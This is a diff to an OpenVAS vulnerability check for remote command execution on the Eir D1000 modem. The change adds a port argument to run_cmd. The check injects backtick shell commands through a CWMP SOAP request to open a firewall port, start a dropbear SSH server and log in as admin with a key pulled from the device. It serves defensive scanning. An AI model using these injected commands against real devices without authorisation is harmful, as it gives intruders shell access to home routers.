@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_eirs_d1000_rce_11_16.nasl 6142 2017-05-17 09:56:17Z ckuerste $
+# $Id: gb_eirs_d1000_rce_11_16.nasl 8372 2018-01-11 10:19:36Z cfischer $
 #
 # Eir D1000 Modem CWMP Remote Command Execution
 #
@@ -30,7 +30,7 @@ CPE = 'cpe:/a:allegrosoft:rompager';
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.140054");
- script_version ("$Revision: 6142 $");
+ script_version ("$Revision: 8372 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
@@ -48,7 +48,7 @@ if (description)
 
  script_tag(name:"qod_type", value:"remote_active");
 
- script_tag(name:"last_modification", value:"$Date: 2017-05-17 11:56:17 +0200 (Wed, 17 May 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2018-01-11 11:19:36 +0100 (Thu, 11 Jan 2018) $");
  script_tag(name:"creation_date", value:"2016-11-11 10:15:15 +0100 (Fri, 11 Nov 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
@@ -65,9 +65,9 @@ include("http_keepalive.inc");
 include("ssh_func.inc");
 include("host_details.inc");
 
-function run_cmd( cmd )
+function run_cmd( cmd, port )
 {
- local_var buf, cmd;
+ local_var buf, cmd, port;
 
  xml = '<?xml version="1.0"?>
  <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
@@ -133,8 +133,8 @@ key = k[1];
 
 nc_port = rand() % 64512 + 1024;
 
-run_cmd( cmd:'`iptables -I INPUT -p tcp --dport ' + nc_port + ' -j ACCEPT`' );
-run_cmd( cmd:'`dropbear -p ' + nc_port + '`' );
+run_cmd( cmd:'`iptables -I INPUT -p tcp --dport ' + nc_port + ' -j ACCEPT`', port:port );
+run_cmd( cmd:'`dropbear -p ' + nc_port + '`', port:port );
 
 sleep( 3 );
 
@@ -144,10 +144,10 @@ if( ! soc ) exit( 99 );
 login = ssh_login( socket:soc, login:'admin', password:key, pub:NULL, priv:NULL, passphrase:NULL );
 close( soc );
 
-run_cmd( cmd: '`iptables -I INPUT -p tcp --dport ' + nc_port + ' -j REJECT`' );
-run_cmd( cmd: "`kill -9 $(pidof dropbear)`" );
-run_cmd( cmd: "`dropbear`" );
-run_cmd( cmd: "pool.ntp.org");
+run_cmd( cmd: '`iptables -I INPUT -p tcp --dport ' + nc_port + ' -j REJECT`', port:port );
+run_cmd( cmd: "`kill -9 $(pidof dropbear)`", port:port );
+run_cmd( cmd: "`dropbear`", port:port );
+run_cmd( cmd: "pool.ntp.org", port:port );
 
 if( login == 0 )
 {
